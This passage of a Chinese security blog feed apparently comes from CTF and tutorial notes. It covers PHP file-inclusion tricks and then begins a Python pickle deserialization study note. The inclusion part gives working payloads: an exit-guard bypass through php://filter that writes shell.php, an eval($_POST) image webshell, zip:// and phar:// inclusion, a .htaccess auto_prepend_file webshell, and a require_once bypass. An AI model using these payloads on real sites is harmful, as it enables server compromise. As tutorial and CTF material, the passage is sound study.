<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">UCS-<span class="number">4</span>*</span><br><span class="line">UCS-<span class="number">4</span>BE</span><br><span class="line">UCS-<span class="number">4</span>LE*</span><br><span class="line">UCS-<span class="number">2</span></span><br><span class="line">UCS-<span class="number">2</span>BE</span><br><span class="line">UCS-<span class="number">2</span>LE</span><br><span class="line">UTF-<span class="number">32</span>*</span><br><span class="line">UTF-<span class="number">32</span>BE*</span><br><span class="line">UTF-<span class="number">32</span>LE*</span><br><span class="line">UTF-<span class="number">16</span>*</span><br><span class="line">UTF-<span class="number">16</span>BE*</span><br><span class="line">UTF-<span class="number">16</span>LE*</span><br><span class="line">UTF-<span class="number">7</span></span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-<span class="number">8</span>*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-<span class="number">2022</span>-JP</span><br><span class="line">ISO-<span class="number">2022</span>-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac</span><br><span class="line">MacJapanese</span><br><span class="line">SJIS-Mobile<span class="comment">#DOCOMO</span></span><br><span class="line">SJIS-DOCOMO</span><br><span class="line">SJIS-Mobile<span class="comment">#KDDI</span></span><br><span class="line">SJIS-KDDI</span><br><span class="line">SJIS-Mobile<span class="comment">#SOFTBANK</span></span><br><span class="line">SJIS-SOFTBANK</span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#DOCOMO</span></span><br><span class="line">UTF-<span class="number">8</span>-DOCOMO</span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#KDDI-A</span></span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#KDDI-B</span></span><br><span class="line">UTF-<span class="number">8</span>-KDDI</span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#SOFTBANK</span></span><br><span class="line">UTF-<span class="number">8</span>-SOFTBANK</span><br><span class="line">ISO-<span class="number">2022</span>-JP-MOBILE<span class="comment">#KDDI</span></span><br><span class="line">ISO-<span class="number">2022</span>-JP-KDDI</span><br><span class="line">JIS</span><br><span class="line">JIS-ms</span><br><span class="line">CP50220</span><br><span class="line">CP50220raw</span><br><span class="line">CP50221</span><br><span class="line">CP50222</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">1</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">2</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">3</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">4</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">5</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">6</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">7</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">8</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">9</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">10</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">13</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">14</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">15</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">16</span>*</span><br><span class="line">byte2be</span><br><span class="line">byte2le</span><br><span class="line">byte4be</span><br><span class="line">byte4le</span><br><span class="line">BASE64</span><br><span class="line">HTML-ENTITIES</span><br><span class="line">HTML</span><br><span class="line"><span class="number">7</span>bit</span><br><span class="line"><span class="number">8</span>bit</span><br><span class="line">EUC-CN*</span><br><span class="line">CP936</span><br><span class="line">GB18030</span><br><span class="line">HZ</span><br><span class="line">EUC-TW*</span><br><span class="line">CP950</span><br><span class="line">BIG-<span class="number">5</span>*</span><br><span class="line">EUC-KR*</span><br><span class="line">UHC</span><br><span class="line">CP949</span><br><span class="line">ISO-<span class="number">2022</span>-KR</span><br><span class="line">Windows-<span class="number">1251</span></span><br><span class="line">CP1251</span><br><span class="line">Windows-<span class="number">1252</span></span><br><span class="line">CP1252</span><br><span class="line">CP866</span><br><span class="line">IBM866</span><br><span class="line">KOI8-R*</span><br><span class="line">KOI8-U*</span><br><span class="line">ArmSCII-<span class="number">8</span></span><br><span class="line">ArmSCII8</span><br></pre></td></tr></table></figure>

<p>使用时，可以利用burp intruder模块，将上述编码方式作为字典进行测试，找到可以使用的编码。</p>
<p>根据编码格式进行解码，就可以看到源文件。</p>
<h6 id="url二次编码"><a href="#url二次编码" class="headerlink" title="url二次编码"></a>url二次编码</h6><p>原理</p>
<p>当数据上传至浏览器的时候，默认会先解一次 <code>url</code> 编码，但 <code>php</code> 包含的 <code>filter</code> ，包含时会再解一次 <code>url</code> 编码（<code>include</code>函数解<code>urlencode</code>的特性）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=filepath</span></span><br><span class="line">php:<span class="comment">//filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=filepath</span></span><br><span class="line">php:<span class="comment">//filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=filepath</span></span><br></pre></td></tr></table></figure>

<p>注意：filter不能二次编码！</p>
<h4 id="php-filter妙用"><a href="#php-filter妙用" class="headerlink" title="php://filter妙用"></a><code>php://filter</code>妙用</h4><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>.=</code>就是拼接。前面的<code>$content</code>已经给了<code>&lt;?php exit; ?&gt;</code>，所以说不管后面是什么，都会先执行退出。导致后面的语句不执行。这也叫PHP死亡退出。</p>
<p><code>$content</code> 在开头增加了<code>exit</code>过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上<code>if(!defined(XXX)exit;)</code>之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
<p>绕过其实也很简单，POST方式提交了参数，这个是可控的，所以尝试PHP伪协议来进行写入一句话，并且使用base64-decode去除死亡退出。</p>
<p>利用<code>php://filter</code>流的<code>base64_decode</code>函数特性去除死亡<code>exit</code>，base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过，<code>&lt;?php exit; ?&gt;</code>这条代码base64解码时，会解码为<code>phpexit</code>，base64解码是<strong>四个byte</strong>一组，所以再增加一个字符，凑够两组，后面的就会正常解码</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;data=aPD9waHAgcGhwaW5mbygpOyA/Pg</span></span><br></pre></td></tr></table></figure>

<p><code>$data</code>中<code>a</code>是为了使base64解码时的phpexit变为8个字节；而<code>PD9waHAgcGhwaW5mbygpOyA/Pg</code>则是<code>&lt;?php phpinfo();?&gt;</code>的base64编码，最终可在shell.php中找到。</p>
<h3 id="包含上传文件获取服务器权限"><a href="#包含上传文件获取服务器权限" class="headerlink" title="包含上传文件获取服务器权限"></a>包含上传文件获取服务器权限</h3><h4 id="直接包含上传的图片文件"><a href="#直接包含上传的图片文件" class="headerlink" title="直接包含上传的图片文件"></a>直接包含上传的图片文件</h4><p>在网站上传位置上传木马图片<code>evil.jpg</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="number">123</span>);<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;0&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接访问<code>evil.jpg</code>，是破损的图片</p>
<p>利用文件包含漏洞，访问<code>http://127.0.0.1/includefile/test.php?file=evil.jpg</code>，可以执行<code>evil.jpg</code>的代码；</p>
<p>利用蚁剑等工具，可以获取服务器shell。</p>
<h4 id="使用压缩协议包含文件"><a href="#使用压缩协议包含文件" class="headerlink" title="使用压缩协议包含文件"></a>使用压缩协议包含文件</h4><p><code>zip://</code>、<code>bzip2://</code>、<code>zlib://</code> 协议，都属于压缩协议，可以访问压缩文件中的子文件。 </p>
<p>适用场景：有的服务器运行文件包含，但是强制给文件添加.php后缀，导致攻击者无法包含非.php后缀的文件。 </p>
<p>利用格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com?file=zip://绝对路径//test.zip%23test_filename</span></span><br></pre></td></tr></table></figure>

<p>优缺点：优点是可以绕过包含的固定后缀。缺点是需要知道文件的绝对路径</p>
<p> 演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/includefile/test.php?file=zip://D:\web13\web13app\phpstudy\PHPTutorial\WWW\includefile\1.png%231.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="使用phar协议"><a href="#使用phar协议" class="headerlink" title="使用phar协议"></a>使用<code>phar</code>协议</h4><p><code>phar://</code>协议，类似于 <code>zip</code> 协议，但是可以使用相对路径。 </p>
<p>格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com/file.php?file=phar://[压缩文件绝对/相对路径]/[压缩文件内的子文件名] </span></span><br></pre></td></tr></table></figure>

<p>优缺点：优点是可以绕过包含的固定后缀。缺点：需要php的版本大于5.3.0 </p>
<p>演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/includefile/test.php?file=phar://1.png/1.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="利用-htaccess实现文件包含"><a href="#利用-htaccess实现文件包含" class="headerlink" title="利用.htaccess实现文件包含"></a>利用<code>.htaccess</code>实现文件包含</h3><p>可以写入或者上传<code>.htaccess</code>文件时，可以在<code>.htaccess</code>中写入代码，再包含自己。</p>
<h4 id="实例及详解"><a href="#实例及详解" class="headerlink" title="实例及详解"></a>实例及详解</h4><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单分析一下，先<code>scandir函数</code>来获取指定目录 <code>./</code>下的所有文件和文件夹的列表，然后如果不为<code>index.php</code>，则<code>unlink函数</code>删除文件。接着就是对上传文件写入内容的黑名单过滤，然后对文件名正则匹配无字母。最后<code>file_put_contents</code>读取文件</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_prepend_fil\e .htaccess <span class="comment">#&lt;?php system(&#x27;cat /fla\g&#x27;);?&gt;\</span></span><br><span class="line"><span class="comment"># 别忘了url编码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_prepend_fi\le <span class="string">&quot;.htaccess&quot;</span> <span class="comment">#&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;\</span></span><br><span class="line"><span class="comment"># 一句话木马也行</span></span><br></pre></td></tr></table></figure>

<p><code>php_value auto_prepend_file</code>表示在执行本目录文件前需要包含指定的文件</p>
<p><code> \</code>的作用是拼接上下文，可以用于绕过关键字过滤</p>
<p><code>#</code>在<code>.htaccess</code>中是注释的意思，但在包含<code>.htacess</code>后不是注释（因为<code>#</code>不是php的注释符），所以可以将一句话木马写在<code>#</code>之后</p>
<p>最后的<code>\</code>是为了和代码最后面拼接的<code>\nHello,world</code>，使这部分也在<code>.htaccess</code>中被当作注释，否则<code>hello world</code>到第四行会执行报错</p>
<h3 id="require-once绕过不能重复包含文件的限制"><a href="#require-once绕过不能重复包含文件的限制" class="headerlink" title="require_once绕过不能重复包含文件的限制"></a>require_once绕过不能重复包含文件的限制</h3><p>PHP的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。</p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"> <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解题需要绕过require_once对同一文件（flag.php）只能包含一次的限制。</p>
<p>题payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/se</span></span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>原理解析：</p>
<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当软连接多到一定程度后，可以绕过这个哈希表，让php认为我们传入的文件名不在哈希表中。 </p>
<p>软连接：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>指向当前进程的/proc/pid/ </span><br><span class="line">/proc/<span class="built_in">self</span>/root/是指向/的符号链接，也就是根目录 </span><br><span class="line">/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/，多个/proc/<span class="built_in">self</span>/root/拼接起来还是根目录</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>python反序列化学习记录</title>
    <url>/2024/03/20/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>前言：寒假的 hgame 2024 中有一道 python 反序列化的题，趁着复现的机会把 ta 给学学掉</p>
<h1 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h1><h2 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p>
<p>pickle 模块只能在 python 中使用， python 中几乎所有的数据类型（列表，字典，集合，类等）都可以用 pickle 来序列化，pickle 序列化后的数据，可读性差，人一般无法识别。</p>
<p>cPickle 模块是 C 语言实现， pickle 是纯 Python 实现，其他的差不多</p>
<h3 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h3><ul>
<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
</ul>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>) <span class="comment">#文件</span></span><br></pre></td></tr></table></figure>
<p>序列化对象，并将结果数据流写入到文件对象中。参数 protocol 是序列化模式，python2.x 默认值为 0 ，python3.x 中默认值为 3，表示以文本的形式序列化。 protocol 的值还可以是 1 或 2 ，表示以二进制的形式序列化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>) <span class="comment">#字符串</span></span><br></pre></td></tr></table></figure>

<p>将 python 数据转换为 pickle 格式的 bytes 字串。</p>
<p>当你想将在 python3.x 的序列化在 python2.x 中加载需要保证 protocol 参数不超过 3 。</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化 :"></a>反序列化 :</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>) <span class="comment">#文件</span></span><br></pre></td></tr></table></figure>

<p>反序列化对象。从 pickle 格式的文件中读取数据并转换为 python 对象。</p>
<p>可选关键字参数是 fix_imports、encoding 和 errors ，它们用于控制 python 2 生成的 pickle 流的兼容性支持。如果 fix_imports 为真，pickle 将尝试将旧的 python2 名称映射到 python3 中使用的新名称。encoding 和 errors 告诉 pickle 如何解码 python 2 pickle 的8位字符串实例；它们分别默认为 ASCII 和 strict 。encoding 可以是 byte，以便将这些8位字符串实例读取为字节对象。</p>
<p>其中要注意的是，在 <code>pickle.load(file)</code> 的时候，要让 python 能够找到类的定义，否则会报错。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(bytes_object, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>) <span class="comment">#字符串</span></span><br></pre></td></tr></table></figure>
<p>将 pickle 格式的 bytes 字串转换为 python 的类型。</p>
<p>以下为序列化和反序列化的结构示意图：</p>
<p><img src="https://s2.loli.net/2024/03/18/zUQDyETg42LZO91.png" alt="sp240318_150237"></p>
<h3 id="简单体验："><a href="#简单体验：" class="headerlink" title="简单体验："></a>简单体验：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">&quot;test&quot;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hello ! My friends&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/19/CqfNYwQ3hjEZznd.png" alt="image-20240318151801444"></p>
<p>另外有一点需要注意：对于我们自己定义的class，如果直接以形如<code>date = 20191029</code>的方式赋初值，<strong>则这个<code>date</code>不会被打包！</strong>解决方案是写一个<code>__init__</code>方法，但在输入的过程中编译器就会提醒你了：</p>
<p><img src="https://s2.loli.net/2024/03/18/Cz1a7IB4Hgp3wKc.png" alt="image-20240318170505162"></p>
<p>按个 Tab 键就行：</p>
<p><img src="https://s2.loli.net/2024/03/18/54jCbvoMUkzROFa.png" alt="image-20240318170605695"></p>
<h3 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h3><p>序列化的字符串是什么意思，又按照什么规则生成的，这就涉及到了 PVM 。</p>
<h4 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h4><p>对于 python 而言，它可以直接从源代码运行程序。 python 解释器会将源代码编译为字节码，然后将编译后的字节码转发到 python 虚拟机中执行。总的来说，PVM 的作用便是用来解释字节码的解释引擎。</p>
<p>pickle 是一门基于栈的编程语言，有不同的编写方式，其本质就是一个轻量级的 PVM 。这个轻量级的 PVM 由三部分组成：</p>
<h5 id="指令处理器-Instruction-processor"><a href="#指令处理器-Instruction-processor" class="headerlink" title="指令处理器 ( Instruction processor )"></a>指令处理器 ( Instruction processor )</h5><p>简称 I P</p>
<p>从数据流中读取操作码和参数，并对其进行解释处理。指令处理器会循环执行这个过程，不断改变 stack 和 memo 区域的值。直到遇到 <code>.</code> 这个结束符号。这时，最终停留在<strong>栈顶</strong>的值将会被作为反序列化对象返回。</p>
<h5 id="栈区-stack"><a href="#栈区-stack" class="headerlink" title="栈区 ( stack )"></a>栈区 ( stack )</h5><p>后进先出</p>
<p>由 Python 的列表 ( list ) 实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在<strong>栈顶</strong>生成反序列化的结果。</p>
<p>栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。</p>
<h5 id="内存区-memo"><a href="#内存区-memo" class="headerlink" title="内存区 ( memo )"></a>内存区 ( memo )</h5><p>由 Python 的字典 ( dict ) 实现，可以看作是数据索引或者标记，为 PVM 的整个生命周期提供存储功能。</p>
<p>简单来说就是将反序列化完成的数据以 key-value 的形式储存在 memo 中，以便使用。</p>
<h4 id="IP-常用的操作码："><a href="#IP-常用的操作码：" class="headerlink" title="IP 常用的操作码："></a>IP 常用的操作码：</h4><ul>
<li><p><code>c</code> : 读取本行的内容作为模块名 module，读取下一行的内容作为对象名 object，然后将 module.object 作为可调用对象压入到栈中。</p>
</li>
<li><p><code>(</code> : 将一个标记对象压入到栈中，用于确定命令执行的位置。该标记常常搭配 t 指令一起使用，以便产生一个元组。</p>
</li>
<li><p><code>S</code> : String，后面跟字符串，PVM 会读取引号中的内容，直到遇见<strong>换行符</strong>（<code>\n</code>），然后将读取到的内容压入到栈中。</p>
</li>
<li><p><code>I</code>：Int，后面跟数字。</p>
</li>
<li><p><code>t</code> : 从栈中不断弹出数据，弹射顺序与压栈时相同，直到弹出左括号。此时弹出的内容形成了一个元组，然后 , 该元组会被压入栈中。</p>
</li>
<li><p><code>R</code> : 将之前压入栈中的元组和可调用对象全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最后将结果压入到栈中。</p>
</li>
<li><p><code>.</code> : 结束整个 pickle 反序列化过程。</p>
</li>
</ul>
<p>过程演示：</p>
<p><img src="https://s2.loli.net/2024/03/18/KI6scO9bu5YWoPk.gif" alt="20200320230631-6204866e-6abc-1"></p>
<h4 id="object-reduce"><a href="#object-reduce" class="headerlink" title="object.__reduce__()"></a><code>object.__reduce__()</code></h4><p>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言， python 要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被 unpickle 时，该 callable（可被调用对象） 就会被调用以生成对象（该 callable 其实是构造函数）。</p>
<p>在 pickle 的 opcode 中，R 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 <code>object.__reduce__()</code> 函数，<code>object.__reduce__()</code> 的返回值会作为 R 的作用对象，当包含该函数的对象被 pickle 序列化时，得到的字符串是包含了 R 的。</p>
<p>过程演示：</p>
<p><img src="https://s2.loli.net/2024/03/18/BZbJmD19O3ksvUH.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
<p>这里的 <code>t</code> 可以消除 <code>(</code> 在栈中的 MARK 数据</p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>pickletools 是 python 自带的 pickle 调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;张三&quot;</span></span><br><span class="line">        self.message = [<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;18岁&#x27;</span>,<span class="string">&#x27;学生&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x = people()</span><br><span class="line">s = pickle.dumps(x,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure>

